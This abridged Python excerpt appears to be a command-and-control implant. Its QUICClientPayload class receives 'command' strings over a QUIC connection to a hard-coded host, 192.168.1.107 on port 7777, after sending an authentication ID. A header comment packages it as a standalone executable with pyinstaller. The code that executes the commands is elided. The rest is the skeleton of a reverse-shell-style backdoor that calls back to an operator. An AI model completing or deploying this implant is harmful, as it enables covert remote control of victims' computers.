# pyinstaller --onefile QUIC_NoEnc.py
...
class QUICClientPayload(QuicConnectionProtocol):
    ...
    def quic_event_received(self, event):
        if isinstance(event, StreamDataReceived):
            ...
            if event.end_stream:
                command = self._buffer.decode(errors="ignore").strip()
                self._buffer = b''
...
async def run_quic_client():
    host = "192.168.1.107"
    port = 7777
    AUTH_ID = "880fbab7-50dc-4cbf-a8ed-aeb2a97cb39b"  
    ...
    async with connect(host, port, configuration=config, create_protocol=QUICClientPayload) as connection:
        ...
        connection._quic.send_stream_data(stream_id, AUTH_ID.encode(), end_stream=True)
        connection.transmit()
